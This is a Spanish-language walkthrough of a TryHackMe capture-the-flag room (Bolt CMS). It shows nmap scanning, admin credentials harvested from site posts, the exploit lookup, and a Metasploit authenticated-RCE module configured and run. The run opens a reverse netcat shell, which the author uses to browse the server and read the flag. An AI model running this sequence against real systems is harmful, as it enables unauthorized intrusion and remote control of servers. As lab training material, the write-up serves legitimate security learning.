### Task 1 - Deploy the machine

En este apartado no se hace nada más que arrancar la máquina virtual del sitio de tryhackme, por lo que solo esperamos a que cargue.
### Task 2 - Hack your way into the machine

Una vez que la tenemos desplegada y nos proporciona una IP, la cual es: , haremos uso de la herramienta nmap con el siguiente comando:

```shell
nmap -sV 10.201.114.180
```
#### Pregunta 1:
Tenemos la primer pregunta, la cual nos dice: **¿Qué número de puerto tiene un servidor web con un CMS ejecutándose?**, una vez que se estableció conexión, revisamos los puertos detectados:

```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    (PHP 7.2.32-1)
```

Obteniendo así la respuesta a la primer pregunta:

```respuesta
8000
```
#### Pregunta 2:
Ahora procedemos a dar solución a la segunda pregunta: **¿Cuál es el nombre de usuario que podemos encontrar en el CMS?**, para esto procedemos colocar en la barra del navegador la IP que nos proporcionaron junto con el puerto 8000, es decir:

```
10.201.114.180:8000
```

Una vez que carga el sitio web, procedemos a explorarlo por cada una de sus pestañas, encontrando en la pestaña *Home*, un ***mensaje del administrador*** donde nos dice:

```texto
Hello Everyone,

Welcome to this site, myself Jake and my username is bolt .I am still new to this CMS so it can take awhile for me to get used to this CMS but believe me i have some great content coming up for you all!

Regards,

Jake (Admin)
```

Encontrando así la respuesta a la segunda pregunta de esta tarea:

```respuesta
bolt
```
#### Pregunta 3:
Tenemos ahora la tercer pregunta para la tarea: **¿Cuál es la contraseña que podemos encontrar para el nombre de usuario?**, para esto procedemos a revisar otro apartado que se llama ***mensaje para el departamento de IT***, donde tenemos lo siguiente:

```
Hey guys,

i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is boltadmin123 just incase you need it!

Regards,

Jake (Admin)
```

Encontrando así la respuesta para la tercera pregunta:

```respuesta
boltadmin123
```
#### Pregunta 4:
En este momento ya conocemos el usuario y la contraseña del administrador, por lo que procedemos a intentar responder la cuarta pregunta: **¿Qué versión del CMS está instalada en el servidor? (Ej.: Nombre 1.1.1)**, para resolver esto, y como no tenemos algo que se nos referencie a simple vista en el sitio web desplegado, procedemos a buscar en ChatGPT, donde nos sugiere una forma de hacerlo si no tenemos acceso:

```
https://tudominio.com/bolt
```

Por lo que ahora procedemos a probar esto en la barra de búsqueda del navegador realizando las modificaciones necesarias, quedando de la siguiente manera:

```
10.201.114.180:8000/bolt
```

Al cargar este sitio, nos aparece la opción de iniciar sesión, al conocer los datos de usuario y la contraseña, los ingresamos.

Los datos son correctos, dado que pudimos ingresar satisfactoriamente, explorando la ventana del navegador que se muestra, encontramos en la esquina inferior izquierda la versión CMS instalada en el servidor.

Obteniendo así, la respuesta de la cuarta pregunta:

```respuesta
Bolt 3.7.1
```
#### Pregunta 5:
Teniendo ahora lo siguiente: **Existe un exploit para una versión anterior de este CMS que permite RCE autenticado. Encuéntralo en la base de datos de exploits. ¿Cuál es su EDB-ID?**, al darnos una pista, procedemos a buscar en otra pestaña del navegador los exploits existentes para Bolt.

En la lista de resultados encontramos la siguiente página web: `https://www.exploit-db.com/exploits/48296`, donde al explorar encontramos el ***EDB-ID***, dando así solución a la quinta pregunta:

```respuesta
48296
```
#### Pregunta 6:
Ahora en la tarea tenemos lo siguiente: **Metasploit añadió recientemente un módulo de explotación para esta vulnerabilidad. ¿Cuál es la ruta completa de este exploit? (Ej.: exploit/...)**.

En la misma ventana del navegador, buscamos entre los resultados mostrados, encontrando uno de la página rapid 7: `https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce/`

Donde al ingresar, tenemos lo siguiente:

```
msf > use exploit/unix/webapp/bolt_authenticated_rce  

msf exploit(bolt_authenticated_rce) > show targets  

...targets...  

msf exploit(bolt_authenticated_rce) > set TARGET < target-id >  

msf exploit(bolt_authenticated_rce) > show options  

...show and set options...  

msf exploit(bolt_authenticated_rce) > exploit
```

Por lo que con esto encontramos la respuesta de la sexta pregunta:

```respuesta
exploit/unix/webapp/bolt_authenticated_rce
```
#### Pregunta 7:
Continuamos ahora con lo siguiente: **Establezca** ***LHOST, LPORT, RHOST, USERNAME, PASSWORD*** **en msfconsole antes de ejecutar el exploit**

Para realizar esto, hacemos uso de **msfconsole**, una vez que nos carga, procedemos a crear el exploit, como se muestra a continuación:

```shell
msf6 > use exploit/unix/webapp/bolt_authenticated_rce
[*] Using configured payload cmd/unix/reverse_netcat
```

Ahora procedemos a revisar la configuración del exploit:

```
msf6 exploit(unix/webapp/bolt_authenticated_rce) > options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name               Current Setting    Required  Description
   ----               ---------------    --------  -----------
   FILE_TRAVERSAL_PA  ../../../public/f  yes       Traversal path from "/files
   TH                 iles                         " on the web server to "/ro
                                                   ot" on the server
   PASSWORD                              yes       Password to authenticate wi
                                                   th
   Proxies                               no        A proxy chain of format typ
                                                   e:host:port[,type:host:port
                                                   ][...]
   RHOSTS                                yes       The target host(s), see htt
                                                   ps://docs.metasploit.com/do
                                                   cs/using-metasploit/basics/
                                                   using-metasploit.html
   RPORT              8000               yes       The target port (TCP)
   SSL                false              no        Negotiate SSL/TLS for outgo
                                                   ing connections
   SSLCert                               no        Path to a custom SSL certif
                                                   icate (default is randomly
                                                   generated)
   TARGETURI          /                  yes       Base path to Bolt CMS
   URIPATH                               no        The URI to use for this exp
                                                   loit (default is random)
   USERNAME                              yes       Username to authenticate wi
                                                   th
   VHOST                                 no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to
                                       listen on. This must be an address on t
                                       he local machine or 0.0.0.0 to listen o
                                       n all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)

```

Procedemos a realizar las adecuaciones que se nos piden:

```shell
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set password boltadmin123
password => boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set rhosts 10.201.114.180
rhosts => 10.201.114.180
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set username bolt
username => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set lhost ens5
lhost => 10.201.35.222
```

Revisamos por última vez la configuración del exploit

```
msf6 exploit(unix/webapp/bolt_authenticated_rce) > options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name               Current Setting    Required  Description
   ----               ---------------    --------  -----------
   FILE_TRAVERSAL_PA  ../../../public/f  yes       Traversal path from "/files
   TH                 iles                         " on the web server to "/ro
                                                   ot" on the server
   PASSWORD           boltadmin123       yes       Password to authenticate wi
                                                   th
   Proxies                               no        A proxy chain of format typ
                                                   e:host:port[,type:host:port
                                                   ][...]
   RHOSTS             10.201.114.180     yes       The target host(s), see htt
                                                   ps://docs.metasploit.com/do
                                                   cs/using-metasploit/basics/
                                                   using-metasploit.html
   RPORT              8000               yes       The target port (TCP)
   SSL                false              no        Negotiate SSL/TLS for outgo
                                                   ing connections
   SSLCert                               no        Path to a custom SSL certif
                                                   icate (default is randomly
                                                   generated)
   TARGETURI          /                  yes       Base path to Bolt CMS
   URIPATH                               no        The URI to use for this exp
                                                   loit (default is random)
   USERNAME           bolt               yes       Username to authenticate wi
                                                   th
   VHOST                                 no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to
                                       listen on. This must be an address on t
                                       he local machine or 0.0.0.0 to listen o
                                       n all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.201.35.222    yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)
```
#### Pregunta 8:
Una vez que ya hicimos lo del paso anterior, tenemos lo siguiente: **Busque flag.txt dentro de la máquina**, lo cual, sabiendo que contamos con el exploit configurado de forma correcta, lo corremos, mostrándonos lo siguiente:

```shell
msf6 exploit(unix/webapp/bolt_authenticated_rce) > run
[*] Started reverse TCP handler on 10.201.35.222:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "eaih".
[*] Found 3 potential token(s) for creating .php files.
[+] Deleted file kjjxbmoybp.php.
[+] Used token 51208302c8ff9f0eaf7728859c to create ddokmsgthyfm.php.
[*] Attempting to execute the payload via "/files/ddokmsgthyfm.php?eaih=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 1 opened (10.201.35.222:4444 -> 10.201.114.180:49616) at 2025-10-21 02:30:11 +0100
[+] Deleted file ddokmsgthyfm.php.
[+] Reverted user profile back to original state.

ls
index.html
pwd
/home/bolt/public/files
cd ../
ls
bolt-public
extensions
files
index.php
theme
thumbs
cd ../
ls
app
composer.json
composer.lock
cron
extensions
index.php
public
README.md
reboot.sh
src
vendor
pwd
/home/bolt
cd ../
ls
bolt
composer-setup.php
flag.txt
pwd
/home
cat flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```

Después de estar explorando la máquina, encontramos la bandera que da solución a la última pregunta de esta tarea:

```flag
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```

Dando así finalización a la segunda tarea y al room.